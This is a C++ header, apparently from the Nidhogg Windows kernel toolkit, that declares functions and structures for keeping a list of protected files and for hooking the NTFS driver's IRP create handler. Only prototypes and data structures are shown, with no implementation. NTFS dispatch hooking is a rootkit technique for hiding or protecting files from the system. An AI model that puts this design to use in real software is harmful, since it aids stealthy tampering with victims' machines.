#pragma once

#include "pch.h"

extern "C" {
	#include "WindowsTypes.hpp"
	#include "NidhoggCommon.h"
}

// Definitions.
#define DEFAULT_DRIVE_LETTER L"C:"
constexpr SIZE_T MAX_FILES = 256;
constexpr SIZE_T SUPPORTED_HOOKED_NTFS_CALLBACKS = 1;

// Prototypes.
bool FindFile(WCHAR* path);
bool AddFile(WCHAR* path);
bool RemoveFile(WCHAR* path);
NTSTATUS HookedNtfsIrpCreate(PDEVICE_OBJECT DeviceObject, PIRP Irp);
NTSTATUS InstallNtfsHook(int irpMjFunction);
NTSTATUS UninstallNtfsHook(int irpMjFunction);

struct FileItem {
	int FileIndex;
	WCHAR FilePath[MAX_PATH];
};

struct FilesList {
	int FilesCount;
	WCHAR* FilesPath[MAX_FILES];
};

struct NtfsCallback {
	PVOID Address;
	bool Activated;
};

struct FileGlobals {
	FilesList Files;
	FastMutex Lock;
	NtfsCallback Callbacks[SUPPORTED_HOOKED_NTFS_CALLBACKS];

	void Init() {
		Files.FilesCount = 0;

		for (int i = 0; i < SUPPORTED_HOOKED_NTFS_CALLBACKS; i++)
			Callbacks[i].Activated = false;

		Lock.Init();
	}
};
inline FileGlobals fGlobals;